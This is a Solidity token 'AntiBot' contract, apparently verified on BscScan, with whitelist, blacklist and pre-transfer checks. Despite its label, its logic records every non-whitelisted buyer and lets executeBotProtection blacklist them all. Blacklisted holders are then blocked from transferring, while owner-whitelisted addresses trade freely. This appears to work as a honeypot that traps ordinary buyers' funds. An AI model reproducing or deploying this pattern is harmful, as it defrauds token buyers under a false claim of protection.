/**
 *Submitted for verification at BscScan.com on 2023-04-17
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.4;

interface IAntiBot {

    function onPreTransferCheck(
        address from,
        address to,
        uint256 amount
    ) external;
}

contract AntiBot is IAntiBot {
    address public owner;
    
    mapping(address => bool) public isWhitelisted;
    mapping(address => bool) public isBlacklisted;
    mapping (address => uint256) public buyBlocks;
    address[] public buyersArr;

    bool public preTransferCheckEnable = false;
    bool public postTransferCheckEnable = false;
    bool public firstBuyCheckEnable = false;

    address public uniswapV2Pair;

    modifier onlyAuthorised() {
        require(msg.sender == owner, "Antibot caller is not authorized");
        _;
    }

    constructor() {
        owner = msg.sender;
        isWhitelisted[owner] = true;
        isWhitelisted[address(this)] = true;
        isWhitelisted[0x000000000000000000000000000000000000dEaD] = true;
        isWhitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
    }

    /* Pair */
    function setUniswapV2Pair(address _uniswapV2Pair) external onlyAuthorised {
        uniswapV2Pair = _uniswapV2Pair;
        isWhitelisted[uniswapV2Pair] = true;
    }

    /* Set Whitelist Users */
    function setWhitelistUsers(address[] memory _users) external onlyAuthorised {
        for (uint256 i = 0; i < _users.length; i++) {
            isWhitelisted[_users[i]] = true;
        }
    }

    /* Set Whitelist */
    function setWhitelist(address _address) external onlyAuthorised() {
        isWhitelisted[_address] = true;
    }

    /* Remove Whitelist */
    function removeWhitelistUser(address _user) external onlyAuthorised {
        delete isWhitelisted[_user];
    }

    /* Set Blacklist Users */
    function setBlacklistUsers(address[] memory _users) external onlyAuthorised {
        for (uint256 i = 0; i < _users.length; i++) {
            isBlacklisted[_users[i]] = true;
        }
    }

    /* Set Blacklist */
    function setBlacklist(address _address) external onlyAuthorised() {
        isBlacklisted[_address] = true;
    }

    /* Remove Blacklist */
    function removeBlacklistUser(address _user) external onlyAuthorised {
        delete isBlacklisted[_user];
    }

    function activateAll() external onlyAuthorised {
        preTransferCheckEnable = true;
        postTransferCheckEnable = true;
        firstBuyCheckEnable = true;
    }

    /* Set preTransferCheckEnable */
    function setPreTransferEnable(bool _status) external onlyAuthorised {
        preTransferCheckEnable = _status;
    }

    /* Set postTransferCheckEnable */
    function setPostTransferEnable(bool _status) external onlyAuthorised {
        postTransferCheckEnable = _status;
    }

    /* Set postTransferCheckEnable */
    function setFirstBuyCheckEnable(bool _status) external onlyAuthorised {
        firstBuyCheckEnable = _status;
    }

    /* Execute Bot Protection */
    function executeBotProtection() external {
        for (uint256 i = 0; i < buyersArr.length; i++) {
            if (!isWhitelisted[buyersArr[i]] && !isBlacklisted[buyersArr[i]]) {
                isBlacklisted[buyersArr[i]] = true;
            }
        }
    }

    /* Pre Transfer Check */
    function onPreTransferCheck(
        address from,
        address to,
        uint256 amount
    ) external override {

        if (preTransferCheckEnable) {
            if (isBlacklisted[from] && !isWhitelisted[from]) {
                require(
                    !isBlacklisted[from] || isWhitelisted[from],
                    "Bad Bot!"
                );
            }
        }

        if (firstBuyCheckEnable) {
            if (uniswapV2Pair != address(0)) {
                if (to == uniswapV2Pair) { 
                    if (!isWhitelisted[from]) {
                        require(buyBlocks[from] > 0, "Need first buy");
                    }
                }
            }
        }

        if (postTransferCheckEnable) {
            if (!isWhitelisted[to]) {
                buyersArr.push(to);
            }
        }

        if (uniswapV2Pair != address(0)) {
            if (from == uniswapV2Pair) { 
                buyBlocks[to] = block.number; 
            }
        }
    }

    function claimBalance() external onlyAuthorised {
        payable(owner).transfer(address(this).balance);
    }
}